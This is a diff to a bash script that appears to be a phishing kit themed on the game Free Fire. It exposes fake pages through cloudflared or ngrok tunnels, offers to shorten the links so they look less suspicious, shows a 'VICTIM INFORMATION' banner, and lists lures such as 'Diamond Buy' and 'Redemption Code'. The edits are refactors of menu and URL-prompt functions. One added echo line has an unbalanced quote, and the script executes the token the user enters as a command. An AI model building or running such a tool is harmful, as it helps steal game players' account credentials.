@@ -3,9 +3,8 @@ echo ""
 
 ## Check Internet Status
 check_status() {
-	echo -e "\e[33mInternet Status :\e[m "
 	timeout 3s curl -fIs "https://api.github.com" > /dev/null
-	[ $? -eq 0 ] && echo -e "\e[92mOnline \e[0m" || echo -e "\e[31mOffline \e[0m"
+	[ $? -eq 0 ] && echo -e \e[33mInternet Status :\e[m \e[92m Online \e[0m" || echo -e "\e[31mOffline \e[0m"
 }
 
 ## server
@@ -58,7 +57,8 @@ read -p $'\e[1;32m\e[94m Please enter your Option (A/B/C) : ' portfrd
 if [[ $portfrd == "A" || $portfrd == "a" || $portfrd == "cloudflare" ]]; then
 echo ""
 start_cloudflared
-l_logo
+clear
+logo_last
                            echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo -e " "
 			   echo -e " "
@@ -69,8 +69,7 @@ l_logo
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri
-url_shortner_c
+askuri_c
 clear
 logo_last
 sleep 3
@@ -85,7 +84,8 @@ echo ""
 clear
 ngroktoken
 start_ngrok
-l_logo
+clear
+logo_last
                            echo -e "\e[96m=======================\e[92m   SUMAN © 2022 FF  \e[96m=======================\e[92m"
                            echo -e " "
 			   echo -e " "
@@ -96,8 +96,7 @@ l_logo
 			   echo ""
 			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================= \e[93m" 
                            echo ""
-askuri
-url_shortner_n
+askuri_n
 clear
 logo_last
 sleep 3
@@ -203,7 +202,7 @@ echo -e ""
 }
 
 # ASK FOR URL MODIFICATION
-function askuri() {
+function askuri_c() {
 echo ""
 read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
 echo""
@@ -211,11 +210,44 @@ echo""
 echo""
 
 if [[ $option == *'Y'* ]]; then
-url_shortner
+url_shortner_c
 
 fi
 if [[ $option == *'y'* ]]; then
-url_shortner
+url_shortner_c
+
+fi
+
+if [[ $option == *'n'* ]]; then
+clear
+echo""
+echo""
+
+fi
+if [[ $option == *'N'* ]]; then
+clear
+echo""
+echo""
+
+fi
+
+echo ""
+}
+
+# ASK FOR URL MODIFICATION
+function askuri_n() {
+echo ""
+read -p $'\e[1;40m\e[31m[\e[32m*\e[31m]\e[32m Do You Want To Modify This Url \e[1;91m (Y/N) : \e[0m' option
+echo""
+echo""
+echo""
+
+if [[ $option == *'Y'* ]]; then
+url_shortner_n
+
+fi
+if [[ $option == *'y'* ]]; then
+url_shortner_n
 
 fi
 
@@ -367,7 +399,7 @@ printf "\e[1;31m[\e[0m\e[1;92m04\e[0m\e[1;31m] \e[0m\e[1;34;103m Redemption Code
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"
 echo
-printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Diamond Buy \e[0m      \e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;48;5;200m Choose Gift + Package Gift + Lucky Spin \e[0m  "
+printf "\e[1;31m[\e[0m\e[1;92m05\e[0m\e[1;31m] \e[0m\e[1;48;5;21m Diamond Buy \e[0m   \e[1;31m[\e[0m\e[1;92m10\e[0m\e[1;31m] \e[0m\e[1;48;5;200m Choose Gift + Package Gift + Lucky Spin\e[0m  "
 echo
 printf "\e[1;31m\e[0m\e[1;92m\e[0m\e[1;31m \e[0m\e[1;37;44m\e[0m"   
 echo
@@ -484,7 +516,8 @@ echo -e "\e[31m[\e[32m*\e[31m]\e[33m Visit \e[32mngrok.com \e[m "
 echo ""
 echo -e "\e[31m[\e[32m*\e[31m]\e[33m Sign up & get ngrok authtoken \e[m "
 echo ""
-read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token [Ex. ngrok authtoken 1Y7IUGD8 ] : \e[0m' token
+read -p $'\e[31m[\e[32m*\e[31m]\e[33m Enter The Ngrok Token \e[91m[Ex. \e[92mngrok config add-authtoken 1ahJYl6... \e[92m] : \e[0m' 
+token
 $token
 echo ""
 fi
